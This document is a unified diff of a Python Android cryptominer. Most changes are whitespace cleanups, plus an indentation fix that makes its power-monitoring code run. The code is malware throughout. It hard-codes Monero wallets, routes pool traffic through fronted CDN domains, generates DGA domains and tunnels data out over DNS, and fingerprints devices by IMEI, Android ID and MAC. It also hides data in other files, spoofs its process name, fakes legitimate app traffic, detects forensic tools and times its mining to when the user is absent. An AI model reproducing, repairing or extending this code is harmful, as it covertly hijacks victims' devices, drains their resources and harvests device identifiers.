@@ -1,4 +1,3 @@
-
 import hashlib
 import time
 import threading
@@ -62,17 +61,17 @@ except:
 
 class AndroidAppContext:
     _context = None
-    
+
     @staticmethod
     def get_context():
         if ANDROID_SERVICE:
             return ANDROID_SERVICE.getApplicationContext()
         return AndroidAppContext._context
-    
+
     @staticmethod
     def set_context(ctx):
         AndroidAppContext._context = ctx
-    
+
     @staticmethod
     def get_system_service(service_name):
         context = AndroidAppContext.get_context()
@@ -84,7 +83,7 @@ class NetworkEvasion:
     def __init__(self):
         self.dga_domains = []
         self._generate_domains()
-        
+
     def _generate_domains(self):
         tlds = ['.com', '.net', '.org', '.xyz', '.info', '.top', '.cloud']
         seed = int(time.time() / 86400)
@@ -92,7 +91,7 @@ class NetworkEvasion:
         for _ in range(8):
             domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
             self.dga_domains.append(domain + random.choice(tlds))
-            
+
     def dns_tunnel(self, data: bytes) -> Optional[bytes]:
         try:
             encoded = base64.b64encode(data).decode()
@@ -137,8 +136,7 @@ class WalletManager:
                     "87jrtiGMcysWEocEq5Vt99h2xehAy43TXe6fbn4iHKwAAe87gr7s4GxVBBunrb9NG5dvXvmjeqXwiX2zTX6LydRwAUnMpkC",
                     "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN",
                    ]
-        
-    
+
     def __init__(self):
         if self.SUBADDRESSES:
             self.addresses = self.SUBADDRESSES
@@ -147,7 +145,7 @@ class WalletManager:
         self.current_wallet = self._pick_wallet()
         self.last_rotation = time.time()
         self.rotation_days = random.uniform(7, 14)
-    
+
     def _pick_wallet(self) -> str:
         try:
             fp = EnvironmentalFP().fingerprint
@@ -155,7 +153,7 @@ class WalletManager:
             return self.addresses[index]
         except:
             return self.addresses[0]
-    
+
     def get_current_wallet(self) -> str:
         if len(self.addresses) > 1:
             if time.time() - self.last_rotation > (self.rotation_days * 86400):
@@ -164,7 +162,7 @@ class WalletManager:
                     self.current_wallet = random.choice(others)
                 self.last_rotation = time.time()
         return self.current_wallet
-    
+
     def get_payout_address(self) -> str:
         return self.get_current_wallet()
 
@@ -172,14 +170,14 @@ class ObfuscatedString:
     _xor_key = 0xAB
     _layer2_key = 0x37
     _substitution_table = {}
-    
+
     def __init__(self, encoded):
         decoded = bytes([b ^ self._xor_key for b in encoded])
         self._data = bytes([b ^ self._layer2_key for b in decoded])
         if not ObfuscatedString._substitution_table:
             ObfuscatedString._substitution_table = {i: (i * 17 + 23) % 256 for i in range(256)}
         self._data = bytes([ObfuscatedString._substitution_table[b] for b in self._data])
-    
+
     def get(self):
         inverse_table = {v: k for k, v in ObfuscatedString._substitution_table.items()}
         decoded = bytes([inverse_table[b] for b in self._data])
@@ -189,13 +187,13 @@ class ObfuscatedString:
 
 class PolymorphicString:
     _instances = {}
-    
+
     def __init__(self, key: str, value: str):
         self.key = key
         self.value = value
         self._permutation = random.randint(0, 255)
         PolymorphicString._instances[key] = self
-    
+
     def get(self) -> str:
         decoded = ''
         for c in self.value:
@@ -206,7 +204,7 @@ class EnvironmentalFP:
     def __init__(self):
         self.fingerprint = self._generate_fingerprint()
         self.earliest_valid_time = int((datetime.now() + timedelta(hours=2)).timestamp())
-    
+
     def _generate_fingerprint(self) -> str:
         components = []
         try:
@@ -214,7 +212,7 @@ class EnvironmentalFP:
                 context = AndroidAppContext.get_context()
                 if context:
                     try:
-                        tm = cast('android.telephony.TelephonyManager', 
+                        tm = cast('android.telephony.TelephonyManager',
                                  context.getSystemService(Context.TELEPHONY_SERVICE))
                         if tm:
                             if Build_VERSION.SDK_INT >= 26:
@@ -243,17 +241,17 @@ class EnvironmentalFP:
                                     components.append(str(meid))
                     except:
                         pass
-                    
+
                     try:
                         android_id = Settings.getString(
-                            context.getContentResolver(), 
+                            context.getContentResolver(),
                             Settings.ANDROID_ID
                         )
                         if android_id:
                             components.append(str(android_id))
                     except:
                         pass
-                    
+
                     try:
                         components.append(Build.MODEL)
                         components.append(Build.MANUFACTURER)
@@ -261,19 +259,19 @@ class EnvironmentalFP:
                         components.append(Build.HARDWARE)
                     except:
                         pass
-                    
+
                     try:
                         components.append(str(Runtime.getRuntime().availableProcessors()))
                         total_mem = Runtime.getRuntime().totalMemory()
                         components.append(str(round(total_mem / 1e9, 2)))
                     except:
                         pass
-                    
+
                     try:
                         components.append(str(Process.myPid()))
                     except:
                         pass
-                    
+
                     try:
                         wifi_manager = cast(
                             'android.net.wifi.WifiManager',
@@ -287,16 +285,16 @@ class EnvironmentalFP:
                                     components.append(mac)
                     except:
                         pass
-            
+
             if not components:
                 components.append(str(uuid.uuid4()))
-        
+
         except:
             components.append(str(uuid.uuid4()))
-        
+
         combined = '|'.join(components)
         return hashlib.sha256(combined.encode()).hexdigest()
-    
+
     def get_activation_time(self) -> int:
         fp_hash = int(self.fingerprint[:16], 16)
         activation_delay = (fp_hash % 7200) + 3600
@@ -308,7 +306,7 @@ class TimingObfuscator:
         self.activation_times = self._generate_dynamic_activation_times()
         self.fake_activity_intervals = []
         self._generate_intervals()
-    
+
     def _generate_dynamic_activation_times(self) -> List[float]:
         try:
             cpu_count = Runtime.getRuntime().availableProcessors()
@@ -319,7 +317,7 @@ class TimingObfuscator:
         except:
             total_ram = 4 * 1024 * 1024 * 1024
         base_delay = (hashlib.sha256(f"{cpu_count}{total_ram}".encode()).digest()[0]) * 100
-        
+
         times = []
         for i in range(random.randint(3, 7)):
             min_delay = base_delay * (i + 1) * random.uniform(0.5, 2.0)
@@ -327,21 +325,21 @@ class TimingObfuscator:
             if random.random() < 0.2:
                 min_delay *= random.uniform(5, 10)
             times.append(random.uniform(min_delay, max_delay))
-        
+
         random.shuffle(times)
         return sorted(times)
-    
+
     def _generate_intervals(self):
         current = 0
         for _ in range(10):
             current += random.uniform(300, 1200)
             self.fake_activity_intervals.append(current)
-    
+
     def should_activate(self) -> int:
         elapsed = time.time() - self.start_time
         if self._recent_system_load() > 70:
             return -1
-        
+
         for idx, activation_time in enumerate(self.activation_times):
             window_width = random.uniform(300 * (idx + 1), 900 * (idx + 1))
             if elapsed > activation_time and elapsed < activation_time + window_width:
@@ -349,7 +347,7 @@ class TimingObfuscator:
                     continue
                 return idx
         return -1
-    
+
     def _recent_system_load(self) -> float:
         try:
             if ANDROID_AVAILABLE:
@@ -361,7 +359,7 @@ class TimingObfuscator:
                         mem_info = activity_manager.getProcessMemoryInfo([Process.myPid()])
                         if mem_info and len(mem_info) > 0:
                             return float(mem_info[0].getTotalPrivateDirty()) / 1024.0
-            
+
             stat_paths = ['/proc/stat', '/proc/loadavg']
             for path in stat_paths:
                 if os.path.exists(path) and os.access(path, os.R_OK):
@@ -379,7 +377,7 @@ class TimingObfuscator:
         except:
             pass
         return 0
-    
+
     def jitter_sleep(self, duration: float):
         jitter = duration * random.uniform(0.85, 1.15)
         time.sleep(jitter)
@@ -388,7 +386,7 @@ class CryptographyLayer:
     def __init__(self):
         self.keys = [os.urandom(32) for _ in range(3)]
         self.nonce = os.urandom(12)
-    
+
     def encrypt(self, data: bytes, layer: int = 0) -> bytes:
         result = data
         for i in range(layer + 1):
@@ -396,7 +394,7 @@ class CryptographyLayer:
             result = base64.b64encode(result)
             result = result[::-1]
         return result
-    
+
     def decrypt(self, data: bytes, layer: int = 0) -> bytes:
         result = data
         for i in range(layer, -1, -1):
@@ -404,7 +402,7 @@ class CryptographyLayer:
             result = base64.b64decode(result)
             result = self._xor_encrypt(result, self.keys[i])
         return result
-    
+
     def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
         return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
 
@@ -413,7 +411,7 @@ class MemoryOnlyStorage:
         self._storage: Dict[str, bytes] = {}
         self._crypto = CryptographyLayer()
         self._checkpoint_file = self._get_checkpoint_path()
-    
+
     def _get_checkpoint_path(self) -> str:
         try:
             context = AndroidAppContext.get_context()
@@ -423,13 +421,13 @@ class MemoryOnlyStorage:
         except:
             pass
         return f'/data/local/tmp/.{uuid.uuid4().hex[:8]}.tmp'
-    
+
     def _flush_to_disk(self):
         if not self._storage:
             return
         try:
             combined = json.dumps({
-                k: base64.b64encode(v).decode() 
+                k: base64.b64encode(v).decode()
                 for k, v in self._storage.items()
             }).encode()
             encrypted = self._crypto.encrypt(combined)
@@ -441,13 +439,13 @@ class MemoryOnlyStorage:
             os.rename(tmp_path, self._checkpoint_file)
         except:
             pass
-    
+
     def store(self, key: str, data: bytes):
         encrypted = self._crypto.encrypt(data, random.randint(0, 2))
         self._storage[key] = encrypted
         if random.random() < 0.01:
             self._flush_to_disk()
-    
+
     def retrieve(self, key: str) -> Optional[bytes]:
         if key in self._storage:
             encrypted = self._storage[key]
@@ -457,7 +455,7 @@ class MemoryOnlyStorage:
                 except:
                     continue
         return self._recover_from_disk(key)
-    
+
     def _recover_from_disk(self, key: str) -> Optional[bytes]:
         try:
             if os.path.exists(self._checkpoint_file):
@@ -470,7 +468,7 @@ class MemoryOnlyStorage:
         except:
             pass
         return None
-    
+
     def wipe(self):
         self._storage.clear()
         try:
@@ -485,17 +483,17 @@ class PayloadManager:
         self.memory_storage = MemoryOnlyStorage()
         self.payloads: Dict[str, bytes] = {}
         self.active_payload = None
-    
+
     def load_payload(self, name: str, payload: bytes):
         obfuscated = self._obfuscate_payload(payload)
         self.payloads[name] = obfuscated
-    
+
     def _obfuscate_payload(self, payload: bytes) -> bytes:
         compressed = zlib.compress(payload, 9)
         key = os.urandom(16)
         xored = bytes([compressed[i] ^ key[i % 16] for i in range(len(compressed))])
         return key + xored
-    
+
     def remove_artifacts(self):
         self.memory_storage.wipe()
         self.payloads.clear()
@@ -506,7 +504,7 @@ class ConnectionManager:
         self.current_proxy = None
         self.retry_delays = [60, 300, 900, 3600, 7200]
         self.failed_attempts = 0
-    
+
     def _generate_proxy_domains(self) -> List[str]:
         front_domains = [
             'd15k2d11x6t4x2.cloudfront.net',
@@ -519,29 +517,29 @@ class ConnectionManager:
             'cloudflare-eth.com',
         ]
         return front_domains
-    
+
     def get_connection_string(self) -> str:
         if not self.current_proxy:
             self.current_proxy = random.choice(self.pool_proxies)
         return f"stratum+ssl://{self.current_proxy}:443"
-    
+
     def get_real_pool_host_header(self) -> str:
         return random.choice([
             "pool.supportxmr.com",
             "pool.minexmr.com",
             "xmrpool.eu"
         ])
-    
+
     def rotate_pool(self):
         self.current_proxy = random.choice(self.pool_proxies)
         self.failed_attempts = 0
-    
+
     def get_backoff_delay(self) -> int:
         idx = min(self.failed_attempts, len(self.retry_delays) - 1)
         delay = self.retry_delays[idx]
         self.failed_attempts += 1
         return delay
-    
+
     def mimic_legitimate_api(self) -> bytes:
         fake_request = (
             "POST /api/v2/telemetry HTTP/1.1\r\n"
@@ -556,7 +554,7 @@ class ModuleLoader:
     def __init__(self):
         self.loaded_modules = {}
         self.module_hashes = {}
-    
+
     def inject_module(self, module_code: bytes):
         module_hash = hashlib.sha256(module_code).hexdigest()
         if module_hash not in self.module_hashes:
@@ -568,12 +566,12 @@ class DNSExfiltrator:
     def __init__(self, domains: List[str]):
         self.domains = domains
         self.encoding_chars = 'abcdefghijklmnopqrstuvwxyz0123456789-'
-    
+
     def exfiltrate(self, data: bytes):
         encoded = base64.b32hexencode(data).decode().lower()
         encoded = encoded.replace('=', '')
         chunks = [encoded[i:i+52] for i in range(0, len(encoded), 52)]
-        
+
         for idx, chunk in enumerate(chunks):
             domain = f"{chunk}.{random.choice(self.domains)}"
             try:
@@ -593,7 +591,7 @@ class ForensicToolDetector:
             'com.topjohnwu.magisk',
             'com.chelpus.lackypatch',
         ]
-    
+
     def is_investigation_active(self) -> bool:
         try:
             if ANDROID_AVAILABLE:
@@ -606,7 +604,7 @@ class ForensicToolDetector:
                             return True
                         except:
                             pass
-                    
+
                     am = cast('android.app.ActivityManager',
                              context.getSystemService(Context.ACTIVITY_SERVICE))
                     if am:
@@ -623,7 +621,7 @@ class ForensicToolDetector:
 class StealthDiskBackup:
     def __init__(self):
         self.target_files = self._find_targets()
-    
+
     def _find_targets(self) -> List[str]:
         targets = []
         try:
@@ -641,17 +639,17 @@ class StealthDiskBackup:
         except:
             pass
         return targets
-    
+
     def _encrypt(self, data: bytes) -> bytes:
         try:
             key = hashlib.sha256(Build.MODEL.encode()).digest()[:16]
         except:
             key = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'
         return bytes([data[i] ^ key[i % 16] for i in range(len(data))])
-    
+
     def _decrypt(self, data: bytes) -> bytes:
         return self._encrypt(data)
-    
+
     def hide(self, data: bytes):
         if not self.target_files:
             return
@@ -666,7 +664,7 @@ class StealthDiskBackup:
                     f.write(entries)
         except:
             pass
-    
+
     def extract(self) -> Optional[bytes]:
         try:
             model = Build.MODEL
@@ -697,7 +695,7 @@ class DNSBackup:
             '9.9.9.9', '208.67.222.222',
         ]
         self.retrieval_domains = NetworkEvasion().dga_domains[:3]
-    
+
     def upload(self, data: bytes):
         encoded = base64.b32hexencode(data).decode().lower()
         chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
@@ -709,7 +707,7 @@ class DNSBackup:
                     socket.getaddrinfo(domain, None)
                 except:
                     pass
-    
+
     def retrieve(self) -> Optional[bytes]:
         try:
             recovery_request = json.dumps({
@@ -732,20 +730,20 @@ class UsagePatternLearner:
         self.last_save_time = 0
         self.save_interval = random.uniform(3600, 7200)
         self._load_history()
-    
+
     def _serialize(self) -> bytes:
         return json.dumps({
             str(h): {str(m): c for m, c in min.items()}
             for h, min in self.usage_history.items()
         }).encode()
-    
+
     def _deserialize(self, data: bytes):
         patterns = json.loads(data.decode())
         self.usage_history = {
             int(h): {int(m): c for m, c in min.items()}
             for h, min in patterns.items()
         }
-    
+
     def _load_history(self):
         data = self.memory_store.retrieve("usage_patterns")
         if data:
@@ -761,7 +759,7 @@ class UsagePatternLearner:
             self._deserialize(data)
             self.memory_store.store("usage_patterns", data)
             return
-    
+
     def _save_history(self):
         serialized = self._serialize()
         self.memory_store.store("usage_patterns", serialized)
@@ -772,24 +770,24 @@ class UsagePatternLearner:
             else:
                 self.stealth_disk.hide(serialized)
             self.last_save_time = current_time
-    
+
     def learn_user_pattern(self):
         current_hour = datetime.now().hour
         current_minute = datetime.now().minute
         current_cpu = self._get_cpu_usage()
-        
+
         if current_hour not in self.usage_history:
             self.usage_history[current_hour] = {}
-        
+
         if current_minute in self.usage_history[current_hour]:
             old_avg = self.usage_history[current_hour][current_minute]
             self.usage_history[current_hour][current_minute] = old_avg * 0.8 + current_cpu * 0.2
         else:
             self.usage_history[current_hour][current_minute] = current_cpu
-        
+
         if random.random() < 0.1:
             self._save_history()
-    
+
     def _get_cpu_usage(self) -> float:
         if ANDROID_AVAILABLE:
             try:
@@ -803,7 +801,7 @@ class UsagePatternLearner:
                             return float(mem_info[0].getTotalPrivateDirty()) / 1024.0
             except:
                 pass
-        
+
         try:
             stat_path = '/proc/stat'
             if os.path.exists(stat_path) and os.access(stat_path, os.R_OK):
@@ -817,7 +815,7 @@ class UsagePatternLearner:
                         return ((total - idle) / total) * 100
         except:
             pass
-        
+
         try:
             loadavg_path = '/proc/loadavg'
             if os.path.exists(loadavg_path) and os.access(loadavg_path, os.R_OK):
@@ -825,13 +823,13 @@ class UsagePatternLearner:
                     return float(f.readline().split()[0]) * 20
         except:
             pass
-        
+
         return 30.0
-    
+
     def predict_user_activity(self) -> str:
         current_hour = datetime.now().hour
         next_hour = (current_hour + 1) % 24
-        
+
         if next_hour in self.usage_history and self.usage_history[next_hour]:
             avg_cpu = sum(self.usage_history[next_hour].values()) / len(self.usage_history[next_hour])
             if avg_cpu < 10:
@@ -841,7 +839,7 @@ class UsagePatternLearner:
             else:
                 return 'HEAVY_USE'
         return 'UNKNOWN'
-    
+
     def get_optimal_mining_windows(self) -> str:
         local_time = datetime.now()
         if local_time.hour >= 2 and local_time.hour < 5:
@@ -861,145 +859,146 @@ class PowerMonitor:
     def __init__(self):
         self.last_check = 0
         self.cached_power_state = None
+
     def check_power_state(self) -> Dict[str, Any]:
         if time.time() - self.last_check < 30 and self.cached_power_state:
             return self.cached_power_state
-    
-            result = {'on_ac': True, 'battery_percent': 100, 'charging': False}
-    
-    try:
-        if ANDROID_AVAILABLE:
-            context = AndroidAppContext.get_context()
-            
-            # METHOD 1: IntentFilter broadcast (works on most devices)
-            if context:
+
+        result = {'on_ac': True, 'battery_percent': 100, 'charging': False}
+
+        try:
+            if ANDROID_AVAILABLE:
+                context = AndroidAppContext.get_context()
+
+                # METHOD 1: IntentFilter broadcast (works on most devices)
+                if context:
+                    try:
+                        ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+                        battery_status = context.registerReceiver(None, ifilter)
+
+                        if battery_status:
+                            level = battery_status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
+                            scale = battery_status.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
+                            status = battery_status.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
+                            plugged = battery_status.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
+
+                            battery_pct = 100
+                            if level >= 0 and scale > 0:
+                                battery_pct = int(level * 100 / scale)
+
+                            on_ac = (plugged > 0 or
+                                    status == BatteryManager.BATTERY_STATUS_CHARGING or
+                                    status == BatteryManager.BATTERY_STATUS_FULL)
+                            charging = (status == BatteryManager.BATTERY_STATUS_CHARGING or
+                                       status == BatteryManager.BATTERY_STATUS_FULL)
+
+                            result = {
+                                'on_ac': on_ac,
+                                'battery_percent': battery_pct,
+                                'charging': charging
+                            }
+                            self.cached_power_state = result
+                            self.last_check = time.time()
+                            return result
+                    except:
+                        pass
+
+                # METHOD 2: BatteryManager system service (API 21+)
+                if context:
+                    try:
+                        bm = cast('android.os.BatteryManager',
+                                 context.getSystemService(Context.BATTERY_SERVICE))
+                        if bm:
+                            # Try getIntProperty first (API 21+)
+                            try:
+                                level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+                                if level > 0:
+                                    # Check charging status
+                                    status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
+                                    on_ac = status in [BatteryManager.BATTERY_STATUS_CHARGING,
+                                                       BatteryManager.BATTERY_STATUS_FULL]
+                                    result = {
+                                        'on_ac': on_ac,
+                                        'battery_percent': level,
+                                        'charging': on_ac
+                                    }
+                                    self.cached_power_state = result
+                                    self.last_check = time.time()
+                                    return result
+                            except:
+                                pass
+
+                            # Fallback: ACTION_BATTERY_CHANGED sticky intent already registered
+                            # This returns cached data without registering again
+                            try:
+                                sticky_intent = context.registerReceiver(None,
+                                    IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+                                if sticky_intent:
+                                    level = sticky_intent.getIntExtra('level', 100)
+                                    scale = sticky_intent.getIntExtra('scale', 100)
+                                    plugged = sticky_intent.getIntExtra('plugged', 1)
+                                    result = {
+                                        'on_ac': plugged != 0,
+                                        'battery_percent': int(level * 100 / scale) if scale > 0 else 100,
+                                        'charging': plugged != 0
+                                    }
+                                    self.cached_power_state = result
+                                    self.last_check = time.time()
+                                    return result
+                            except:
+                                pass
+                    except:
+                        pass
+
+                # METHOD 3: Read from /sys/class/power_supply (Linux-based, needs root on some devices)
                 try:
-                    ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
-                    battery_status = context.registerReceiver(None, ifilter)
-                    
-                    if battery_status:
-                        level = battery_status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
-                        scale = battery_status.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
-                        status = battery_status.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
-                        plugged = battery_status.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)
-                        
-                        battery_pct = 100
-                        if level >= 0 and scale > 0:
-                            battery_pct = int(level * 100 / scale)
-                        
-                        on_ac = (plugged > 0 or 
-                                status == BatteryManager.BATTERY_STATUS_CHARGING or 
-                                status == BatteryManager.BATTERY_STATUS_FULL)
-                        charging = (status == BatteryManager.BATTERY_STATUS_CHARGING or 
-                                   status == BatteryManager.BATTERY_STATUS_FULL)
-                        
-                        result = {
-                            'on_ac': on_ac,
-                            'battery_percent': battery_pct,
-                            'charging': charging
-                        }
-                        self.cached_power_state = result
-                        self.last_check = time.time()
-                        return result
-                except:
-                    pass
-            
-            # METHOD 2: BatteryManager system service (API 21+)
-            if context:
-                try:
-                    bm = cast('android.os.BatteryManager',
-                             context.getSystemService(Context.BATTERY_SERVICE))
-                    if bm:
-                        # Try getIntProperty first (API 21+)
-                        try:
-                            level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-                            if level > 0:
-                                # Check charging status
-                                status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
-                                on_ac = status in [BatteryManager.BATTERY_STATUS_CHARGING,
-                                                   BatteryManager.BATTERY_STATUS_FULL]
-                                result = {
-                                    'on_ac': on_ac,
-                                    'battery_percent': level,
-                                    'charging': on_ac
-                                }
-                                self.cached_power_state = result
-                                self.last_check = time.time()
-                                return result
-                        except:
-                            pass
-                        
-                        # Fallback: ACTION_BATTERY_CHANGED sticky intent already registered
-                        # This returns cached data without registering again
-                        try:
-                            sticky_intent = context.registerReceiver(None, 
-                                IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-                            if sticky_intent:
-                                level = sticky_intent.getIntExtra('level', 100)
-                                scale = sticky_intent.getIntExtra('scale', 100)
-                                plugged = sticky_intent.getIntExtra('plugged', 1)
-                                result = {
-                                    'on_ac': plugged != 0,
-                                    'battery_percent': int(level * 100 / scale) if scale > 0 else 100,
-                                    'charging': plugged != 0
-                                }
-                                self.cached_power_state = result
-                                self.last_check = time.time()
-                                return result
-                        except:
-                            pass
-                except:
-                    pass
-            
-            # METHOD 3: Read from /sys/class/power_supply (Linux-based, needs root on some devices)
-            try:
-                ac_paths = [
-                    '/sys/class/power_supply/AC/online',
-                    '/sys/class/power_supply/ac/online',
-                    '/sys/class/power_supply/battery/status',
-                ]
-                battery_paths = [
-                    '/sys/class/power_supply/battery/capacity',
-                    '/sys/class/power_supply/BAT0/capacity',
-                ]
-                
-                # Check AC status
-                on_ac = False
-                for ac_path in ac_paths:
-                    if os.path.exists(ac_path) and os.access(ac_path, os.R_OK):
-                        with open(ac_path, 'r') as f:
-                            content = f.read().strip().lower()
-                            if content in ['1', 'charging', 'full']:
-                                on_ac = True
+                    ac_paths = [
+                        '/sys/class/power_supply/AC/online',
+                        '/sys/class/power_supply/ac/online',
+                        '/sys/class/power_supply/battery/status',
+                    ]
+                    battery_paths = [
+                        '/sys/class/power_supply/battery/capacity',
+                        '/sys/class/power_supply/BAT0/capacity',
+                    ]
+
+                    # Check AC status
+                    on_ac = False
+                    for ac_path in ac_paths:
+                        if os.path.exists(ac_path) and os.access(ac_path, os.R_OK):
+                            with open(ac_path, 'r') as f:
+                                content = f.read().strip().lower()
+                                if content in ['1', 'charging', 'full']:
+                                    on_ac = True
+                                    break
+
+                    # Check battery level
+                    battery_pct = 100
+                    for bat_path in battery_paths:
+                        if os.path.exists(bat_path) and os.access(bat_path, os.R_OK):
+                            with open(bat_path, 'r') as f:
+                                battery_pct = int(f.read().strip())
                                 break
-                
-                # Check battery level
-                battery_pct = 100
-                for bat_path in battery_paths:
-                    if os.path.exists(bat_path) and os.access(bat_path, os.R_OK):
-                        with open(bat_path, 'r') as f:
-                            battery_pct = int(f.read().strip())
-                            break
-                
-                result = {
-                    'on_ac': on_ac,
-                    'battery_percent': battery_pct,
-                    'charging': on_ac
-                }
-                self.cached_power_state = result
-                self.last_check = time.time()
-                return result
-            except:
-                pass
-    
-    except:
-        pass
-    
+
+                    result = {
+                        'on_ac': on_ac,
+                        'battery_percent': battery_pct,
+                        'charging': on_ac
+                    }
+                    self.cached_power_state = result
+                    self.last_check = time.time()
+                    return result
+                except:
+                    pass
+
+        except:
+            pass
+
         # If ALL methods fail, assume AC power (safe default)
         self.cached_power_state = result
         self.last_check = time.time()
         return result
-    
+
     def get_score(self) -> int:
         power = self.check_power_state()
         if not power['on_ac'] and power['battery_percent'] < 50:
@@ -1016,7 +1015,7 @@ class ThermalMonitor:
     def __init__(self):
         self.temp_readings = []
         self.max_readings = 10
-    
+
     def get_cpu_temperature(self) -> float:
         try:
             thermal_paths = [
@@ -1032,7 +1031,7 @@ class ThermalMonitor:
                             return temp
         except:
             pass
-        
+
         try:
             if ANDROID_AVAILABLE:
                 context = AndroidAppContext.get_context()
@@ -1046,7 +1045,7 @@ class ThermalMonitor:
         except:
             pass
         return 50.0
-    
+
     def get_score(self) -> int:
         temp = self.get_cpu_temperature()
         self.temp_readings.append(temp)
@@ -1077,7 +1076,7 @@ class ProcessMonitor:
             'com.discord',
             'com.valvesoftware.android.steam',
         ]
-    
+
     def check_competitive_processes(self) -> float:
         try:
             if ANDROID_AVAILABLE:
@@ -1096,7 +1095,7 @@ class ProcessMonitor:
         except:
             pass
         return 0
-    
+
     def detect_realtime_communication(self) -> bool:
         try:
             if ANDROID_AVAILABLE:
@@ -1115,10 +1114,10 @@ class ProcessMonitor:
         except:
             pass
         return False
-    
+
     def has_important_apps(self) -> bool:
         return self.check_competitive_processes() > 10 or self.detect_realtime_communication()
-    
+
     def get_score(self) -> int:
         if self.detect_realtime_communication():
             return 0
@@ -1136,7 +1135,7 @@ class ScreenMonitor:
     def __init__(self):
         self.last_check = 0
         self.cached_state = False
-    
+
     def is_screen_locked_or_off(self) -> bool:
         if time.time() - self.last_check < 10:
             return self.cached_state
@@ -1155,7 +1154,7 @@ class ScreenMonitor:
             self.cached_state = False
         self.last_check = time.time()
         return self.cached_state
-    
+
     def get_score(self) -> int:
         if self.is_screen_locked_or_off():
             return 200
@@ -1166,7 +1165,7 @@ class NetworkMonitor:
         self.last_bytes = 0
         self.last_time = time.time()
         self.streaming_threshold = 500000
-    
+
     def user_is_streaming(self) -> bool:
         try:
             if ANDROID_AVAILABLE:
@@ -1178,7 +1177,7 @@ class NetworkMonitor:
                         active_network = cm.getActiveNetworkInfo()
                         if active_network and active_network.isConnected():
                             return False
-            
+
             traffic_path = '/proc/net/dev'
             if os.path.exists(traffic_path) and os.access(traffic_path, os.R_OK):
                 with open(traffic_path, 'r') as f:
@@ -1202,7 +1201,7 @@ class NetworkMonitor:
         except:
             pass
         return False
-    
+
     def should_communicate_now(self) -> bool:
         conditions = [
             ScreenMonitor().is_screen_locked_or_off(),
@@ -1210,7 +1209,7 @@ class NetworkMonitor:
             self.user_is_streaming(),
         ]
         return any(conditions)
-    
+
     def get_score(self) -> int:
         if self.user_is_streaming():
             return 0
@@ -1225,7 +1224,7 @@ class SmartMiningOrchestrator:
         self.screen = ScreenMonitor()
         self.network = NetworkMonitor()
         self.risk_level = 0
-    
+
     def calculate_mining_intensity(self) -> float:
         scores = []
         weights = []
@@ -1265,7 +1264,7 @@ class SmartMiningOrchestrator:
         total_weight = sum(weights)
         final_intensity = total_score / total_weight if total_weight > 0 else 0
         return self.map_intensity_to_cpu(final_intensity)
-    
+
     def map_intensity_to_cpu(self, intensity: float) -> float:
         if intensity > 90:
             return random.uniform(60, 80)
@@ -1277,7 +1276,7 @@ class SmartMiningOrchestrator:
             return random.uniform(5, 10)
         else:
             return 0
-    
+
     def fake_legitimate_activity(self):
         if self.risk_level > 70:
             activities = [
@@ -1287,7 +1286,7 @@ class SmartMiningOrchestrator:
                 self.fake_browser_idle_task
             ]
             random.choice(activities)()
-    
+
     def fake_system_sync(self):
         try:
             for _ in range(2):
@@ -1295,13 +1294,13 @@ class SmartMiningOrchestrator:
                 time.sleep(random.uniform(120, 300))
         except:
             pass
-    
+
     def fake_google_play_check(self):
         try:
             time.sleep(random.uniform(60, 180))
         except:
             pass
-    
+
     def fake_contacts_sync(self):
         try:
             for _ in range(3):
@@ -1309,7 +1308,7 @@ class SmartMiningOrchestrator:
                 time.sleep(random.uniform(30, 60))
         except:
             pass
-    
+
     def fake_browser_idle_task(self):
         try:
             for _ in range(3):
@@ -1322,10 +1321,10 @@ class AdaptiveNetworkMimicry:
     def __init__(self):
         self.network = NetworkMonitor()
         self.screen = ScreenMonitor()
-    
+
     def should_communicate_now(self) -> bool:
         return self.network.should_communicate_now()
-    
+
     def mimic_youtube_analytics(self, data: bytes) -> bytes:
         headers = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
@@ -1339,7 +1338,7 @@ class AdaptiveNetworkMimicry:
             http_header += f'{k}: {v}\r\n'
         http_header += f'Content-Length: {len(data)}\r\n\r\n'
         return http_header.encode() + data
-    
+
     def mimic_android_telemetry(self, data: bytes) -> bytes:
         headers = {
             'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13)',
@@ -1350,7 +1349,7 @@ class AdaptiveNetworkMimicry:
             http_header += f'{k}: {v}\r\n'
         http_header += f'Content-Length: {len(data)}\r\n\r\n'
         return http_header.encode() + data
-    
+
     def mimic_chrome_autoupdate(self, data: bytes) -> bytes:
         headers = {
             'User-Agent': 'Chrome/120.0.6099.144 Mobile',
@@ -1380,14 +1379,14 @@ class ProcessDisguise:
                     f.write(name)
         except:
             pass
-    
+
     @staticmethod
     def full_process_spoof(target_process: str):
         try:
             ProcessDisguise.set_process_name(target_process)
         except:
             pass
-    
+
     @staticmethod
     def randomize_disguise():
         disguises = [
@@ -1436,7 +1435,7 @@ class StealthMiner:
         self.current_intensity = 0.0
         self.fake_activity_thread = None
         self.forensic_detector = ForensicToolDetector()
-        
+
     def _generate_mining_data(self) -> Dict[str, Any]:
         return {
             "version": random.randint(1, 10),
